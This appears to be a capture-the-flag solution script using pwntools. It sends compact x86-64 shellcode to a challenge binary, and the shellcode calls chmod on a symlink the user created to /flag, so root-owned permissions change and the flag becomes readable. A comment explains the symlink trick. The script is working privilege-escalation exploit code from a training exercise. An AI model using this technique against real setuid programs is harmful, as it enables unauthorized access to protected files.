#!/usr/bin/python3

from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'error'
context.arch = "amd64"
elf = context.binary = ELF('/challenge/pocket-payload')

"""
Here intresting part is there is a file which have only read acces to root then 
we can create a symbolik link of the file . in this case i make symlink of /flag to name f using `ln -s /flag f` command in ~ dir
and when the root change the permission in that f file the permission of /flag file also change
thus i run this shellcode in ~ dor and i do chmod to that f by 7  and read the flag
"""

#shellcode = open("shellcode_raw","rb").read()
shellcode = asm("""
mov al, 90
push 7
pop rsi
lea rdi, [rdx+11]
syscall
filename:
	.string "f"
""")
io = process()

io.send(shellcode)
io.interactive()
